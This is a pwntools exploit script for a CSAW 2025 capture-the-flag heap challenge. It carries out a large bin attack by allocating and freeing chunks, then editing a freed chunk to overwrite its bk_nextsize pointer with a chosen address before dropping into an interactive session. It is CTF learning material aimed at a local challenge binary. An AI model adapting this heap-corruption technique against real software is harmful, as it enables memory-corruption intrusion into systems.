#NOTICE : This challenge was taken from CSAW2025 pwn categroy, even tho i solved it in a completly unintended way 
#yet the intended method was large_bin_attack and thats how it's solved here

from pwn import *

def start():
    return process('./chall')

def alloc(io, idx, size, data):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b': ', str(size).encode())
    io.sendafter(b'Data: ', data)

def free(io, idx):
    io.sendline(b'2\n')
    io.sendlineafter(b'Index: ', str(idx).encode())

def edit(io, idx, data):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendafter(b': ', data)

def show(io, idx):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b': ', str(idx).encode())
    # print the output from 'show'
    output = io.recvline(timeout=1)
    print(output.decode(errors='ignore'))

def call_func(io):
    io.sendlineafter(b'>> ', b'5')

def safe_link(addr, ptr):
    return (addr >> 12) ^ ptr

def solve():
    io = start()
    
    # Attach GDB
    gdb.attach(io, gdbscript="""
    source /home/kali/Desktop/pwn/pwndbg/gdbinit.py
""")
    
    # Example allocations
    alloc(io,1,4200,b"P1\n")
    alloc(io,2,4096,b"C1\n")
    alloc(io,3,4184,b"P2\n")
    alloc(io,4,4096,b"C2\n")
    free(io,1)
    alloc(io,5,4240,b"P3\n")
    free(io,3)
    pl=b"AAAAAAAAAAAAAAAAAAAAAAAA" +p64(0x4040c0-0x20)
    edit(io,1,pl)
    io.sendline(b"\n")
    alloc(io,6,4250,b"LAST P\n")

    

    # Keep interaction open
    io.interactive()

if __name__ == "__main__":
    solve()
